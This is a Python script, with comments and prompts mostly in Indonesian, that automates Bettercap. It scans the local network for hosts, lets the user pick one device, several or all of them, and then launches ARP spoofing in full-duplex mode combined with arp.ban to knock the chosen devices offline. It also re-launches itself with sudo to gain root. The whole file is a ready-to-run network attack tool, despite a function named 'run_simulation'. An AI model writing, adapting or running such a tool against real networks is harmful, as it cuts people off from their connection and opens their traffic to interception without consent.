#!/usr/bin/env python3
import sys
import os
import time
import subprocess
import re
import ipaddress

RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "bright_green": "\033[38;5;46m",
    "red": "\033[91m",
    "gray": "\033[90m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
}


def pastikan_root():
    """Otomatis meminta hak akses sudo jika dijalankan tanpa root."""
    if os.geteuid() != 0:
        print(f"{COLORS['yellow']}[!] Skrip ini membutuhkan akses root untuk menjalankan Bettercap.{RESET}")
        print("[*] Mencoba mengalihkan ke sudo otomatis...\n")
        try:
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
        except Exception as e:
            print(f"{COLORS['red']}[[-] Gagal mendapatkan akses sudo: {e}{RESET}")
            sys.exit(1)


def print_clean_line(text, color=COLORS["green"]):
    """Mencetak teks langsung tanpa animasi glitch."""
    print(f"{color}{text}{RESET}")


def jalankan_bettercap_otomatis():
    """Menjalankan net.probe on secara instan tanpa animasi loading glitch."""
    devices = []
    bettercap_cmds = "net.probe on; sleep 3; net.show; quit"
    cmd = ["bettercap", "-silent", "-eval", bettercap_cmds]
    
    try:
        print(f"{COLORS['red']}>> LOADING... Please wait.{RESET}")
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Mengambil output setelah proses selesai
        output, _ = process.communicate()

        # Membersihkan kode warna ANSI bawaan Bettercap
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-9?]*[a-zA-Z])')
        clean_output = ansi_escape.sub('', output)

        for line in clean_output.splitlines():
            if "─" in line or "┌" in line or "└" in line or "┤" in line:
                continue

            parts = [p.strip() for p in line.split("│") if p.strip()]
            if len(parts) >= 2:
                ip = parts[0]
                mac = parts[1]
                vendor = parts[2] if len(parts) > 2 else "Unknown"

                try:
                    parsed_ip = ipaddress.ip_address(ip)
                except ValueError:
                    continue

                if not isinstance(parsed_ip, ipaddress.IPv4Address):
                    continue

                if ip.lower() != "ip" and not ip.startswith("pilih"):
                    devices.append({
                        "ip": ip,
                        "mac": mac,
                        "vendor": vendor
                    })
                    
    except FileNotFoundError:
        print(f"\n{COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{COLORS['red']}[!] Terjadi kesalahan: {e}{RESET}")
        
    return devices


def jalankan_arp_attack(targets):
    """Jalankan Bettercap untuk arp.spoof + arp.ban dengan teks status yang bersih."""
    if isinstance(targets, list):
        targets = ",".join(targets)

    cmd = ["bettercap", "-silent"]

    print(f"\n{COLORS['cyan']}[LIVE] Menjalankan BAN ON...{RESET}")
    print(f"{COLORS['yellow']}[LIVE] Target: {targets}{RESET}")
    print(f"{COLORS['gray']}[!] Tekan Ctrl+C untuk menghentikan serangan.{RESET}\n")

    try:
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True,
        )
    except FileNotFoundError:
        print(f"\n{COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{COLORS['red']}[!] Terjadi kesalahan saat menjalankan Bettercap: {e}{RESET}")
        sys.exit(1)

    try:
        time.sleep(0.5)
        if process.stdin is not None:
            process.stdin.write(f"set arp.spoof.targets {targets}\n")
            process.stdin.write("set arp.spoof.fullduplex true\n")
            process.stdin.write("arp.spoof on\n")
            process.stdin.write("arp.ban on\n")
            process.stdin.flush()

        print(f"{COLORS['red']}[ATTACKING] BAN ON ACTIVE...{RESET}")
        while True:
            if process.poll() is not None:
                print(f"\n{COLORS['red']}[!] Bettercap berhenti mendadak.{RESET}")
                break
            time.sleep(1)

    except KeyboardInterrupt:
        if process.stdin is not None:
            try:
                process.stdin.write("arp.ban off\n")
                process.stdin.write("arp.spoof off\n")
                process.stdin.write("quit\n")
                process.stdin.flush()
            except BrokenPipeError:
                pass

        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()

        sys.stdout.write(CLEAR)
        sys.stdout.flush()
        print_clean_line("[!] ARP attack dihentikan. Memulihkan target...", COLORS["red"])
        time.sleep(1.0)
        return


def exit_program():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    sys.exit(0)


def parse_target_selection(selection, max_index):
    targets = set()
    for part in selection.split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            bounds = part.split('-', 1)
            if len(bounds) != 2:
                return None
            try:
                start = int(bounds[0].strip())
                end = int(bounds[1].strip())
            except ValueError:
                return None
            if start < 1 or end < start or end > max_index:
                return None
            targets.update(range(start, end + 1))
        else:
            try:
                idx = int(part)
            except ValueError:
                return None
            if idx < 1 or idx > max_index:
                return None
            targets.add(idx)
    return sorted(targets)


def run_simulation():
    pastikan_root()

    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    
    print_clean_line(">> [SYS] STARTING AUTOMATED BETTERCAP INSTANCE...", COLORS["cyan"])
    print_clean_line(">> [EXEC] net.probe on (Scanning local area network...)", COLORS["bright_green"])
    
    live_devices = jalankan_bettercap_otomatis()
    
    if not live_devices:
        live_devices = [
            {"ip": "192.168.1.1", "mac": "00:11:22:33:44:55", "vendor": "Gateway (No other hosts found)"}
        ]

    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    print_clean_line(">> [SYS] NETWORK SCAN COMPLETE.", COLORS["cyan"])
    print_clean_line(">> [EXEC] net.show (Displaying discovered targets)", COLORS["bright_green"])
    
    print("\n" + "-" * 65)
    header = f"{'NO':<5}{'IP ADDRESS':<18}{'MAC ADDRESS':<20}{'VENDOR'}"
    print(f"{BOLD}{header}{RESET}")
    print("-" * 65)
    
    for i, dev in enumerate(live_devices, start=1):
        line = f"{i:<5}{dev['ip']:<18}{dev['mac']:<20}{dev['vendor']}"
        print_clean_line(line, COLORS["green"])
        
    print("-" * 65)
    all_no = len(live_devices) + 1
    print(f"{COLORS['yellow']}{all_no}. TARGET ALL DEVICES{RESET}")
    print(f"{COLORS['cyan']}p. PICK TARGETS{RESET}\n")
    print(f"{COLORS['red']}0. BACK TO MENU{RESET}")
    print(f"{COLORS['red']}99. EXIT{RESET}")
    
    sys.stdout.write(f"{COLORS['yellow']}>> pilih nomer target: {RESET}")
    sys.stdout.flush()
    choice = input().strip()
    
    if choice.lower() == "p":
        sys.stdout.write(f"{COLORS['yellow']}>> who else the target (contoh: 1-4, 1,3,5): {RESET}")
        sys.stdout.flush()
        selection = input().strip()
        picked = parse_target_selection(selection, len(live_devices))
        if not picked:
            print(f"\n{COLORS['red']}Pilihan target tidak valid.{RESET}")
            time.sleep(0.8)
            return True
        target_ips = [live_devices[i - 1]['ip'] for i in picked]
        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke IP: {', '.join(target_ips)}{RESET}")
        time.sleep(0.5)
        jalankan_arp_attack(target_ips)
    elif choice == "0":
        menu_path = os.path.join(os.path.dirname(__file__), "bettercap-menu.py")
        if not os.path.exists(menu_path):
            menu_path = os.path.join(os.path.dirname(__file__), "menu.py")
        os.execvp(sys.executable, [sys.executable, menu_path])
    elif choice == "99":
        exit_program()
    elif choice == str(all_no):
        target_ips = [dev['ip'] for dev in live_devices]
        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke: SEMUA PERANGKAT{RESET}")
        time.sleep(0.5)
        jalankan_arp_attack(target_ips)
    elif choice.isdigit() and 1 <= int(choice) <= len(live_devices):
        selected = live_devices[int(choice) - 1]
        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke IP: {selected['ip']}{RESET}")
        time.sleep(0.5)
        jalankan_arp_attack(selected['ip'])
    else:
        print(f"\n{COLORS['red']}Pilihan tidak valid.{RESET}")
        time.sleep(0.8)
    return True


if __name__ == "__main__":
    try:
        while run_simulation():
            pass
    except KeyboardInterrupt:
        print("\n\nAborted.")
        sys.exit(0)